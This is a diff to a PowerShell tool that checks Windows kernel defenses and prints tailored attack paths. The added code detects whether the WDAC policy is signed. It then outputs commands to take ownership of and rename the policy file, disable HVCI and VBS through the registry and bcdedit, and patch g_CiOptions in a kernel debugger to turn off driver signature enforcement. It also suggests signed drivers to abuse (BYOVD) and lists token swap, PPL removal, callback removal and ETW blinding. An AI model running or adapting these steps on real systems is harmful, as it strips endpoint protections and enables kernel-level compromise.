@@ -80,6 +80,83 @@ if ($csProduct -match "Virtual|VMware|VirtualBox|Xen|QEMU|HVM|KVM" -or $biosVend
     $isVM = $true
 }
 
+# --- WDAC Policy Signed Detection ---
+# Determines whether the WDAC KMCI policy is signed (cannot be deleted/replaced)
+# or unsigned (can be deleted by admin for bypass). This drives the attack path.
+$wdacPolicySigned = $null  # $null = unknown, $true = signed, $false = unsigned
+$wdacPolicyDetails = @()
+$wdacCiToolAvail = $false
+
+if ($kmci -ge 1) {
+    # Primary: CiTool.exe (Windows 11 21H2+ / Server 2022+, requires elevation)
+    try {
+        $ciRaw = CiTool.exe --list-policies -json 2>$null
+        if ($ciRaw) {
+            $ciJson = $ciRaw | ConvertFrom-Json
+            $ciPolicies = $ciJson.Policies
+            # Only mark CiTool as available if we actually got policy data
+            # Access Denied (0x80070005) returns OperationResult without Policies
+            if ($ciPolicies -and $ciPolicies.Count -gt 0) {
+                $wdacCiToolAvail = $true
+                foreach ($pol in $ciPolicies) {
+                    # Skip the Microsoft driver blocklist policy
+                    if ($pol.FriendlyName -match "Microsoft Windows Driver Policy|Driver Block") { continue }
+                    # Skip unauthorized policies
+                    if (-not $pol.IsAuthorized) { continue }
+
+                    $wdacPolicyDetails += [PSCustomObject]@{
+                        PolicyID   = $pol.PolicyID
+                        Name       = $pol.FriendlyName
+                        Enforced   = $pol.IsEnforced
+                        Signed     = $pol.IsSignedPolicy
+                        System     = $pol.IsSystemPolicy
+                        OnDisk     = $pol.IsOnDisk
+                    }
+
+                    if ($pol.IsSignedPolicy) { $wdacPolicySigned = $true }
+                    elseif ($wdacPolicySigned -ne $true) { $wdacPolicySigned = $false }
+                }
+            }
+        }
+    } catch {}
+
+    # Fallback: check policy file locations if CiTool unavailable or access denied
+    if (-not $wdacCiToolAvail) {
+        $polFiles = @()
+        $sipPath  = "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
+        $vbsPath  = "C:\Windows\System32\CodeIntegrity\VbsSiPolicy.p7b"
+        $cipDir   = "C:\Windows\System32\CodeIntegrity\CiPolicies\Active"
+
+        if (Test-Path $sipPath) { $polFiles += $sipPath }
+        if (Test-Path $vbsPath) { $polFiles += $vbsPath }
+        if (Test-Path $cipDir) {
+            Get-ChildItem -Path $cipDir -Filter "*.cip" -EA SilentlyContinue | ForEach-Object { $polFiles += $_.FullName }
+        }
+
+        foreach ($pf in $polFiles) {
+            # Heuristic: read first 2KB and look for PKCS#7 SignedData OID (1.2.840.113549.1.7.2)
+            # Hex: 06 09 2A 86 48 86 F7 0D 01 07 02
+            try {
+                $bytes = [System.IO.File]::ReadAllBytes($pf)
+                $hex = [BitConverter]::ToString($bytes[0..([Math]::Min(2048, $bytes.Length - 1))]) -replace '-',''
+                $hasSignedData = $hex -match '06092A864886F70D010702'
+
+                $wdacPolicyDetails += [PSCustomObject]@{
+                    PolicyID = "N/A"
+                    Name     = [System.IO.Path]::GetFileName($pf)
+                    Enforced = ($kmci -eq 2)
+                    Signed   = $hasSignedData
+                    System   = $false
+                    OnDisk   = $true
+                }
+
+                if ($hasSignedData) { $wdacPolicySigned = $true }
+                elseif ($wdacPolicySigned -ne $true) { $wdacPolicySigned = $false }
+            } catch {}
+        }
+    }
+}
+
 # --- Helpers ---
 $W = { param($l,$v,$c) Write-Host ("    {0,-28} " -f $l) -NoNewline -ForegroundColor Gray; Write-Host $v -ForegroundColor $c }
 $vM = @{0='Off';1='Configured';2='Running'}
@@ -110,6 +187,20 @@ if ($dbxSz) { & $W "  DBX Size" "$dbxSz bytes" "DarkGray" }
 & $W "VBS"               "$vbsStatus ($($vM[$vbsStatus]))"                      $(if(!$vbsOn){"Green"}else{"Yellow"})
 & $W "HVCI"              $(if($hvciOn){"RUNNING $(if($hvciLk){'[UEFI LOCKED]'})"}else{"OFF"})  $(if(!$hvciOn){"Green"}else{"Red"})
 & $W "WDAC KMCI"         "$kmci ($($cM[$kmci]))"                                $(if($kmci -lt 2){"Green"}else{"Yellow"})
+if ($kmci -ge 1) {
+    $signedStr = if ($wdacPolicySigned -eq $true) { "SIGNED [tamper-resistant]" }
+                 elseif ($wdacPolicySigned -eq $false) { "UNSIGNED [removable]" }
+                 else { "UNKNOWN" }
+    $signedCol = if ($wdacPolicySigned -eq $true) { "Red" }
+                 elseif ($wdacPolicySigned -eq $false) { "Green" }
+                 else { "DarkYellow" }
+    & $W "  WDAC Policy" $signedStr $signedCol
+    foreach ($wp in $wdacPolicyDetails) {
+        $polLabel = if ($wp.Name) { $wp.Name } else { $wp.PolicyID }
+        $polInfo = "$(if($wp.Enforced){'Enforced'}else{'Audit'}) | $(if($wp.Signed){'Signed'}else{'Unsigned'})"
+        & $W "    $polLabel" $polInfo "DarkGray"
+    }
+}
 & $W "WDAC UMCI"         "$umci ($($cM[$umci]))"                                $(if($umci -eq 0){"Green"}elseif($umci -eq 1){"Yellow"}else{"Red"})
 & $W "Credential Guard"  $(if($cgOn){"RUNNING $(if($cgLk){'[UEFI LOCKED]'})"}else{"OFF"})  $(if(!$cgOn){"Green"}else{"Yellow"})
 & $W "System Guard"      $(if($sgOn){"RUNNING"}elseif($sgCfg){"CONFIGURED"}else{"OFF"})  $(if(!$sgOn -and !$sgCfg){"Green"}else{"Yellow"})
@@ -187,8 +278,11 @@ if ($cgLk -and !$hvciLk) {
 }
 if ($kmci -eq 2) {
     EnsureWarnHeader
+    $polSignNote = if ($wdacPolicySigned -eq $true) { "Policy is SIGNED: cannot be deleted or replaced without authorized signer key." }
+                   elseif ($wdacPolicySigned -eq $false) { "Policy is UNSIGNED: can be deleted/renamed by admin (takeown + rename + reboot)." }
+                   else { "Policy signature status unknown. Try rename to test." }
     WarnBlock "WDAC Kernel Mode Code Integrity ENFORCED" `
-        "A WDAC KMCI policy is enforced. Even with g_CiOptions=0, the WDAC policy can independently block drivers not covered by the policy allow rules. WDAC operates as a separate enforcement layer above basic DSE." `
+        "A WDAC KMCI policy is enforced. Even with g_CiOptions=0, the WDAC policy can independently block drivers not covered by the policy allow rules. WDAC operates as a separate enforcement layer above basic DSE. $polSignNote" `
         $null
 }
 $gpoHvci = $gpoVals["HypervisorEnforcedCodeIntegrity"]
@@ -206,7 +300,11 @@ if ($gpoOn -and $null -ne $gpoHvci -and [int]$gpoHvci -ge 1 -and !$hvciOn) {
 # Only $hvciUefiLocked (HVCI lock) determines base difficulty, not CG lock.
 # CG lock protects LSASS credentials but does not affect driver loading.
 # WDAC KMCI enforcement is shown as a qualifier since it adds an independent blocking layer.
-$wdacTag = if ($kmci -eq 2) { " [+WDAC]" } elseif ($kmci -eq 1) { " [WDAC:Audit]" } else { "" }
+$wdacTag = if ($kmci -eq 2 -and $wdacPolicySigned -eq $true) { " [+WDAC:Signed]" }
+           elseif ($kmci -eq 2 -and $wdacPolicySigned -eq $false) { " [+WDAC:Unsigned]" }
+           elseif ($kmci -eq 2) { " [+WDAC]" }
+           elseif ($kmci -eq 1) { " [WDAC:Audit]" }
+           else { "" }
 $diff = if     (!$sb -and ($bcdTs -or $bcdNi))              { "TRIVIAL" }
         elseif (!$sb)                                        { "EASY" }
         elseif ($sb -and !$hvciOn -and !$blActive)           { "MODERATE" }
@@ -274,7 +372,11 @@ Write-Host "  $([string]::new([char]0x2550, 76))" -ForegroundColor Magenta
 Write-Host ""
 
 $activeCol = if (!$sb) { 0 } elseif ($sb -and !$hvciOn) { 1 } elseif ($sb -and $hvciOn -and !$hvciUefiLocked) { 2 } else { 3 }
-$headers = @("SB Off","SB+NoHV","SB+HVCI","SB+Lock")
+
+# When SB is off but HVCI is running, some SB Off capabilities change
+$sbOffHvci = !$sb -and $hvciOn
+
+$headers = @($(if($sbOffHvci){"SBOff+HV"}else{"SB Off"}),"SB+NoHV","SB+HVCI","SB+Lock")
 
 Write-Host ("    {0,-34}" -f "") -NoNewline
 for ($i = 0; $i -lt 4; $i++) {
@@ -288,16 +390,16 @@ $Y = "YES"; $N = " no"; $A = "n/a"
 $matrix = @(
     @("DSE bypass available",          $Y,  $Y,     $N,  $N),
     @("  via BCD flags",               $Y,  $N,     $N,  $N),
-    @("  via g_CiOptions patch",       $Y,  $Y,     $N,  $N),
+    @("  via g_CiOptions patch",       $(if($sbOffHvci){$N}else{$Y}),  $Y,     $N,  $N),
     @("  via WinRE Safe Mode",         $A,  $A,     $Y,  $Y),
-    @("Unsigned driver (post-bypass)", $Y,  $Y,     " 1)", " 1)"),
+    @("Unsigned driver (post-bypass)", $(if($sbOffHvci){" 2)"}else{$Y}),  $Y,     " 1)", " 1)"),
     @("BYOVD driver load",            "$Y*", "$Y*", "$Y*", "$Y*"),
     @("Token swap (EPROCESS.Token)",   $Y,  $Y,     $Y,  $Y),
     @("PPL zero (EPROCESS.Protection)",$Y,  $Y,     $Y,  $Y),
     @("Callback removal (Notify)",     $Y,  $Y,     $Y,  $Y),
     @("ETW blind (provider patch)",    $Y,  $Y,     $Y,  $Y),
-    @("Kernel code exec (W^X)",        $Y,  $Y,     $N,  $N),
-    @("Disable HVCI (registry)",       $A,  $A,     $Y,  $N),
+    @("Kernel code exec (W^X)",        $(if($sbOffHvci){$N}else{$Y}),  $Y,     $N,  $N),
+    @("Disable HVCI (registry)",       $(if($sbOffHvci){$Y}else{$A}),  $A,     $Y,  $N),
     @("Disable HVCI (firmware)",       $A,  $A,     $Y,  $Y),
     @("Disable HVCI (WinRE SafeMode)", $A,  $A,     $Y,  $Y)
 )
@@ -320,6 +422,11 @@ Write-Host "    * BYOVD requires valid Authenticode signature + RFC3161 timestam
 Write-Host "      within certificate validity period, and driver not on blocklist" -ForegroundColor DarkGray
 Write-Host "    1) Only via WinRE Safe Mode bypass (HVCI inactive), not during" -ForegroundColor DarkGray
 Write-Host "       normal operation. Requires physical access + reboot." -ForegroundColor DarkGray
+if ($sbOffHvci) {
+    Write-Host "    2) HVCI is running despite Secure Boot being off. Unsigned drivers" -ForegroundColor Yellow
+    Write-Host "       require disabling HVCI first (registry + reboot). Test-signed" -ForegroundColor Yellow
+    Write-Host "       drivers work via BCD testsigning without disabling HVCI." -ForegroundColor Yellow
+}
 if ($kmci -eq 2) {
     Write-Host "    ! WDAC KMCI enforced: all capabilities above are additionally gated" -ForegroundColor Yellow
     Write-Host "      by WDAC policy allow rules. Drivers not in the policy are blocked" -ForegroundColor Yellow
@@ -335,22 +442,58 @@ Write-Host ""
 
 # --- WDAC preamble (shown once before any attack path if KMCI enforced) ---
 if ($kmci -eq 2) {
-    Write-Host "    ! WDAC KMCI ENFORCED" -ForegroundColor Yellow
+    $signedLabel = if ($wdacPolicySigned -eq $true) { "SIGNED" }
+                   elseif ($wdacPolicySigned -eq $false) { "UNSIGNED" }
+                   else { "SIGNATURE UNKNOWN" }
+    $signedColor = if ($wdacPolicySigned -eq $true) { "Red" }
+                   elseif ($wdacPolicySigned -eq $false) { "Yellow" }
+                   else { "DarkYellow" }
+
+    Write-Host "    ! WDAC KMCI ENFORCED [$signedLabel]" -ForegroundColor $signedColor
     Note "A WDAC kernel-mode policy is active. This is an independent enforcement layer"
     Note "above DSE. Even after disabling DSE (g_CiOptions=0), the WDAC policy evaluates"
     Note "every driver load against its allow rules (hash, signer, file attributes)."
     Note "Impact: your BYOVD driver AND your target driver must both be covered by the"
     Note "WDAC allow rules, or the policy must be disabled/set to audit first."
     Note ""
-    Note "WDAC bypass options:"
-    Note "  1. Switch KMCI to audit mode (requires reboot, logs but does not block):"
-    Cmd "Set-RuleOption -FilePath <policy.xml> -Option 3  (Audit Mode)"
-    Note "  2. If policy is unsigned: delete the WDAC policy file and reboot"
-    Note "     Policy locations: C:\Windows\System32\CodeIntegrity\SIPolicy.p7b (single)"
-    Note "     or C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{GUID}.cip (multiple)"
-    Note "     Note: driversipolicy.p7b is the driver blocklist, NOT the WDAC KMCI policy"
-    Note "  3. If policy is signed: only replaceable with a signed update policy"
-    Note "  4. Use a driver that matches existing WDAC allow rules (signer-based)"
+
+    if ($wdacPolicySigned -eq $false) {
+        Note "WDAC bypass options (policy is UNSIGNED, admin-removable):"
+        Note "  1. Delete/rename the WDAC policy file and reboot (simplest):"
+        Note "     Single policy format:"
+        Cmd "takeown /f `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`""
+        Cmd "icacls `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" /grant administrators:F"
+        Cmd "ren `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" `"SIPolicy.old`""
+        Note "     Multiple policy format (check for .cip files):"
+        Cmd "dir C:\Windows\System32\CodeIntegrity\CiPolicies\Active\"
+        Note "     Remove .cip files (NOT driversipolicy.p7b, that is the blocklist)"
+        Note "  2. Use a driver whose signer matches WDAC allow rules (no reboot):"
+        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
+        Note "     covered by default allow rules for Microsoft signers."
+    } elseif ($wdacPolicySigned -eq $true) {
+        Write-Host "    ! Policy is SIGNED. Cannot be deleted, renamed, or replaced without" -ForegroundColor Red
+        Write-Host "      a signed update policy from the authorized signer." -ForegroundColor Red
+        Note ""
+        Note "WDAC bypass options (limited):"
+        Note "  1. Use a driver whose signer matches WDAC allow rules (only viable option):"
+        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
+        Note "     covered by default allow rules for Microsoft signers."
+        Note "  2. Obtain the signing certificate and deploy a permissive update policy"
+        Note "     (requires access to the WDAC policy signing key, unlikely in most scenarios)"
+        Note "  3. Boot into Safe Mode or WinRE: WDAC policies may not load in Safe Mode"
+        Note "     depending on policy configuration (not guaranteed)"
+    } else {
+        Note "WDAC bypass options (unable to determine if policy is signed):"
+        Note "  1. Try to delete/rename the policy file (works if unsigned):"
+        Cmd "takeown /f `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`""
+        Cmd "icacls `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" /grant administrators:F"
+        Cmd "ren `"C:\Windows\System32\CodeIntegrity\SIPolicy.p7b`" `"SIPolicy.old`""
+        Note "     If rename succeeds but policy persists after reboot: policy is signed."
+        Note "  2. Use a driver whose signer matches WDAC allow rules (always works):"
+        Note "     Microsoft WHQL-signed drivers (KslD.sys, ThrottleStop.sys) are likely"
+        Note "     covered by default allow rules for Microsoft signers."
+    }
+
     Write-Host ""
     Write-Host "    $([string]::new([char]0x2500, 70))" -ForegroundColor DarkGray
     Write-Host ""
@@ -363,6 +506,23 @@ if (!$sb -and ($bcdTs -or $bcdNi)) {
     Write-Host ""
     Step 1 "sc create Drv type= kernel binPath= C:\path\to\driver.sys"
     Step 2 "sc start Drv"
+
+    if ($hvciOn) {
+        Write-Host ""
+        Write-Host "    * HVCI is running (does not block BCD-relaxed drivers):" -ForegroundColor Yellow
+        if ($bcdTs) {
+            Note "testsigning is active. Test-signed drivers pass HVCI validation because"
+            Note "HVCI enforces signature checks, and test certificates are accepted when"
+            Note "testsigning is enabled. Driver loading works."
+        }
+        if ($bcdNi) {
+            Note "nointegritychecks is active. This disables CI enforcement entirely."
+            Note "Note: with HVCI, skci.dll in VTL1 may still enforce independently."
+            Note "If driver fails to load, fall back to testsigning instead."
+        }
+        Note "W^X is enforced: g_CiOptions patching and unsigned code injection blocked."
+        Note "Data-only attacks (token swap, PPL zero, callback removal) still work."
+    }
 }
 elseif (!$sb -and $bcdDbg) {
     # --- EASY: Debug mode, attach and patch ---
@@ -370,13 +530,26 @@ elseif (!$sb -and $bcdDbg) {
     Note "g_CiOptions in ci.dll controls DSE. Setting it to 0 disables all driver"
     Note "signature checks. Requires a second machine on the same network."
     Write-Host ""
-    Step 1 "From debugger host: WinDbg -k net:port=50000,key=<KEY>"
-    Step 2 "Break in, then: ed ci!g_CiOptions 0"
-    Note "Resolve symbol: x ci!g_CiOptions (Win10+, g_CiOptions lives in ci.dll)"
-    Note "Fallback for older builds: ed nt!g_CiOptions 0"
-    Step 3 "Resume target: g"
-    Step 4 "On target: sc create Drv type= kernel binPath= C:\path\to\driver.sys && sc start Drv"
-    Step 5 "(Cleanup) Restore g_CiOptions to original value from debugger"
+
+    if ($hvciOn) {
+        Write-Host "    ! HVCI is running. g_CiOptions patching via debugger will NOT work." -ForegroundColor Red
+        Note "HVCI enforces code integrity via skci.dll in VTL1 independently of ci.dll."
+        Note "Debugger writes to g_CiOptions in VTL0 have no effect on VTL1 enforcement."
+        Note "Use BCD testsigning instead (test-signed drivers pass HVCI validation):"
+        Cmd "bcdedit /set testsigning on && shutdown /r /t 0"
+        Note ""
+        Note "Alternative: disable HVCI first, then use debugger:"
+        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
+        Cmd "shutdown /r /t 0"
+    } else {
+        Step 1 "From debugger host: WinDbg -k net:port=50000,key=<KEY>"
+        Step 2 "Break in, then: ed ci!g_CiOptions 0"
+        Note "Resolve symbol: x ci!g_CiOptions (Win10+, g_CiOptions lives in ci.dll)"
+        Note "Fallback for older builds: ed nt!g_CiOptions 0"
+        Step 3 "Resume target: g"
+        Step 4 "On target: sc create Drv type= kernel binPath= C:\path\to\driver.sys && sc start Drv"
+        Step 5 "(Cleanup) Restore g_CiOptions to original value from debugger"
+    }
 }
 elseif (!$sb) {
     # --- EASY: Secure Boot off, set BCD ---
@@ -388,11 +561,31 @@ elseif (!$sb) {
     Step 2 "shutdown /r /t 0"
     Step 3 "sc create Drv type= kernel binPath= C:\path\to\driver.sys && sc start Drv"
 
-    if ($vbsOn) {
+    if ($hvciOn) {
         Write-Host ""
-        Write-Host "    * VBS hypervisor is loaded (optional to remove):" -ForegroundColor Yellow
-        Note "The hypervisor alone does not block driver loading. HVCI is off, so"
-        Note "g_CiOptions lives in VTL0 and BCD testsigning takes effect normally."
+        Write-Host "    * HVCI is running (testsigning still works):" -ForegroundColor Yellow
+        Note "HVCI enforces that kernel code passes code integrity validation via skci.dll"
+        Note "in VTL1. A test-signed driver IS signed (test certificate). With testsigning"
+        Note "enabled, test certificates are accepted by CI. HVCI validates the signature,"
+        Note "finds it acceptable, and allows the driver to load."
+        Note ""
+        Note "HVCI does enforce W^X (EPT): kernel code pages are writable XOR executable."
+        Note "This blocks g_CiOptions patching and unsigned code injection, but does NOT"
+        Note "block loading of test-signed or production-signed drivers."
+        Note ""
+        Note "Data-only attacks (token swap, PPL zero, callback removal, ETW blind) work"
+        Note "regardless since EPROCESS and callback arrays reside in VTL0."
+        Note ""
+        Note "To fully remove HVCI (optional, only needed for unsigned drivers or code injection):"
+        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity`" /v Enabled /t REG_DWORD /d 0 /f"
+        Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
+        Cmd "bcdedit /set vsmlaunchtype off && bcdedit /set hypervisorlaunchtype off"
+    } elseif ($vbsOn) {
+        Write-Host ""
+        Write-Host "    * VBS hypervisor is loaded without HVCI (optional to remove):" -ForegroundColor Yellow
+        Note "The hypervisor is active (VTL0/VTL1 split) but HVCI is not consuming it."
+        Note "ci.dll enforces DSE in VTL0 only. g_CiOptions is in normal kernel memory"
+        Note "and BCD testsigning takes effect normally. No W^X enforcement on code pages."
         Note "To fully unload the hypervisor (reduces overhead, cleans up):"
         Cmd "reg add `"HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard`" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f"
     }
